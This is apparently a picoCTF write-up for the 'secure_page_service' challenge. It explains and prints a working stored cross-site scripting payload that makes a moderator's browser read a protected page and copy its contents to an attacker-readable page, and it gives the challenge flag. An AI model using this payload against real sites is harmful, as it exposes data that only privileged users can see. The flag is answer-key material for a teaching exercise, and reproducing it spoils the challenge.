# secure_page_service (100)

The important thing to note in this problem is that you can make the moderator visit any page you have access to, and that moderators can visit any page.  This means that if you make one page access another, you can make a mod read any page.  You can futher exploit this by printing it to a new page.

The hint is important because it shows that HTML is rendered in the viewer.  Additionally, we can extend this to the fact that JS will be executed as well.

Putting these facts together, all we need to do is write a script that uses cross-site scripting to take the contents of the target page and print it into the contents of a new page.

By playing around with the service and monitoring what requests are made for different operations, we can find that pages are accessed via the request `GET /view_page.php?id=[id]` and that new pages are created via the request `POST /create_page.php`, with form data set for `page_id`, `contents`, and `password`.

This problem can be solved by putting the following script on any page:

```
<script>
var xhr = new XMLHttpRequest();
xhr.onload = function(){
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://sps.picoctf.com/create_page.php", true);
    var formData = new FormData();
    formData.append("page_id", "---any empty page id here---");
    formData.append("contents", this.responseText);
    formData.append("password", "");
    xhr.send(formData);
}
xhr.open("GET", "http://sps.picoctf.com/view_page.php?page_id=43440b22864b30a0098f034eaf940730ca211a55", true);
xhr.send();
</script>
```

This must be saved to the page *with a password*, or else the user will trip the JS themselves.  After creating the page, the user just needs to try to visit it and report it to the moderator.  Then the flag, `wow_cross_site_scripting_is_such_web`, will be alerted when visiting the page provided in the `formData.append("page_id", ...)` line.